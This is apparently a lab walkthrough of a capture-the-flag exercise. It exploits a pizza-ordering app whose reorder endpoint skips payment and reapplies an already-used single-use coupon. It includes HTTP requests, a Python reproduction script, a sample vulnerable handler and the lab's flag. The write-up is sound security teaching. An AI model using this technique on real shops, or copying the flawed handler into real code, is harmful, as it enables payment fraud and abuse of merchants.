# cheesy-010 - BugForge Lab Walkthrough

**URL:** https://lab-1783954919845-je7kes.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Business logic - reorder endpoint skips payment and re-enables a single-use coupon
**Flag:** `bug{R19BmVTMLH60uhWA8Cw15i9he6qgbu2J}`

---

## Summary

Cheesy Does It is a pizza ordering React SPA with an Express.js backend. Past orders can be repeated with a "Reorder" button, which calls `POST /api/orders/:id/reorder`. Unlike the normal checkout flow, which validates a card, processes a payment, and only then creates the order, the reorder endpoint creates a new "received" order with no payment step at all. The handler also accepts an undocumented `coupon_code` field in its request body - even though the frontend never sends one - and reapplies the coupon without re-checking whether it has already been used. Combining this with a coupon that is restricted to one use per customer produces a full bypass of that restriction and a free order.

---

## Tech Stack

- Frontend: React SPA (CRA, MUI), JWT in localStorage
- Backend: Express.js, SQLite
- Auth: JWT (HS256)
- Test payment processor: accepts card `4444 4444 4444 4444`, exp `12/25`, cvv `123`

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/register` | POST | No | Returns JWT directly |
| `/api/payment/validate` | POST | JWT | Returns a `payment_token` |
| `/api/payment/process` | POST | JWT | Charges the token |
| `/api/orders` | POST | JWT | Requires a valid `payment_token`; server recalculates the total from menu prices |
| `/api/coupons/apply` | POST | JWT | Validates a coupon code and returns the discount amount |
| `/api/orders/:id` | GET | JWT | Ownership-checked, returns full order detail |
| `/api/orders/:id/reorder` | POST | JWT | Ownership-checked, but skips payment and coupon reuse validation |

---

## Discovery

### Step 1 - Enumerate the app

Pulling the homepage and its JS bundle surfaces the standard API routes (login, register, menu, orders, payment, admin). A dedicated `/reorder` route does not show up in a generic `/api/[a-zA-Z0-9/_-]+` regex sweep because it is built with string concatenation in the bundle. Grepping the bundle for the literal word `reorder` finds it:

```
Eo.post("/api/orders/".concat(e,"/reorder"))
```

### Step 2 - Confirm normal checkout enforces payment and price

```
POST /api/orders with a manipulated total_price
-> {"error":"Order total does not match payment amount","calculated":"10.99","paid":"0.01"}
```

The server recalculates the order total from the item names/toppings against the menu, so client-side price manipulation on the main checkout path is not viable.

### Step 3 - Confirm reorder ownership is enforced

```
POST /api/orders/<victim order id>/reorder as a different user
-> {"error":"Order not found"} for every foreign order ID tried
```

This is not an IDOR - the reorder endpoint correctly scopes lookups to the caller's own orders.

### Step 4 - Place a real order using a one-per-customer coupon

```
POST /api/coupons/apply {"code":"FOUNDERS20","subtotal":10.99}
-> {"discount_type":"percent","discount_value":20,"discount_amount":2.2}
```

Full checkout (validate -> process -> create order) with `coupon_code: "FOUNDERS20"` succeeds and returns `total: 8.79`. A second attempt to apply the same coupon on a normal order is correctly rejected:

```
POST /api/coupons/apply {"code":"FOUNDERS20", ...}
-> {"error":"You have already used this coupon"}
```

### Step 5 - Reorder with the coupon reinjected

The frontend never sends a body on the reorder call, but the backend still parses `req.body`. Supplying `coupon_code` manually reapplies the already-used coupon with no payment step and no reuse check:

```
POST /api/orders/14/reorder
Body: {"coupon_code":"FOUNDERS20"}

-> {
     "id": 44,
     "message": "Reorder placed successfully - promo applied",
     "status": "received",
     "coupon_code": "FOUNDERS20",
     "coupon_discount": 2.2,
     "coupon_reused": true,
     "total": 8.79,
     "flag": "bug{R19BmVTMLH60uhWA8Cw15i9he6qgbu2J}"
   }
```

A generic, non-restricted coupon reused the same way applies a discount but does not return a flag - the flag is tied specifically to bypassing the single-use restriction on the branded, one-per-customer coupon.

### Reproduction script

```python
import json, urllib.request

TARGET = "https://lab-1783954919845-je7kes.labs-app.bugforge.io"

def post(path, body, tok=None):
    h = {"Content-Type": "application/json"}
    if tok:
        h["Authorization"] = "Bearer " + tok
    req = urllib.request.Request(TARGET + path, data=json.dumps(body).encode(), headers=h)
    return json.loads(urllib.request.urlopen(req).read())

reg = post("/api/register", {"username": "pentest_c", "email": "pentest_c@example.com", "password": "Passw0rd!123"})
token = reg["token"]

pv = post("/api/payment/validate", {"card_number": "4444 4444 4444 4444", "exp_month": "12", "exp_year": "25", "cvv": "123", "amount": 8.79}, tok=token)
post("/api/payment/process", {"card_number": "4444 4444 4444 4444", "amount": 8.79, "payment_token": pv["payment_token"]}, tok=token)

order = post("/api/orders", {
    "items": [{"pizza_name": "Classic Margherita", "base_name": "Thin Crust", "sauce_name": "Classic Tomato",
               "size": "Medium", "toppings": [], "quantity": 1, "unit_price": 10.99, "total_price": 10.99}],
    "delivery_address": "123 Test St",
    "phone": "5555555555",
    "payment_method": "card",
    "payment_token": pv["payment_token"],
    "coupon_code": "FOUNDERS20"
}, tok=token)

result = post(f"/api/orders/{order['id']}/reorder", {"coupon_code": "FOUNDERS20"}, tok=token)
print(result["flag"])
# bug{R19BmVTMLH60uhWA8Cw15i9he6qgbu2J}
```

---

## Dead Ends

| Tried | Result |
|---|---|
| Cross-user IDOR on `/api/orders/:id/reorder` | Correctly returns "Order not found" for every foreign order ID - ownership check is solid here |
| Client-side price manipulation on `POST /api/orders` | Server recalculates the total from menu prices and rejects mismatches |
| `coupon_code` as an array on the reorder body (stacking) | `{"error":"Invalid or inactive coupon code"}` - lookup does a strict string match |
| SQL injection on the `:id` path segment of reorder | Parameterized, no effect |
| `points_used` / `points_to_use` fields on the reorder body | Silently ignored, no change to the order total |
| Mass assignment (`is_admin`, `role`) on `PUT /api/profile` | Fails even with benign fields - endpoint appears unrelated to this vulnerability |
| Reusing a generic, non-restricted coupon via the same reorder body trick | Discount applied, `coupon_reused` stayed false, no flag |
| High volume of free reorders looking for a threshold-triggered flag | No flag - the flag is condition-gated, not volume-gated |

## Root Cause

The reorder handler reimplements order creation as a separate code path instead of reusing the same validated logic as the main checkout, and loses two checks in the process:

```javascript
// Vulnerable pattern (approximate)
app.post('/api/orders/:id/reorder', authenticate, async (req, res) => {
  const original = await db.get('SELECT * FROM orders WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
  if (!original) return res.status(404).json({ error: 'Order not found' });

  let discount = 0;
  if (req.body.coupon_code) {
    // applies the coupon without checking coupon_usage for this user/coupon pair
    discount = await applyCoupon(req.body.coupon_code, original.subtotal);
  }

  // no payment_token required, no call to the payment service
  const newOrder = await createOrderFromItems(original.items, req.user.id, discount);
  res.json(newOrder);
});
```

`POST /api/orders` correctly requires a `payment_token` from a completed payment flow and checks single-use coupons against a usage table. `POST /api/orders/:id/reorder` omits both checks while still accepting the same `coupon_code` parameter internally.

## CWE / OWASP

- **CWE-840**: Business Logic Errors
- **CWE-841**: Improper Enforcement of Behavioral Workflow
- **OWASP API Security Top 10**: API6:2023 - Unrestricted Access to Sensitive Business Flows
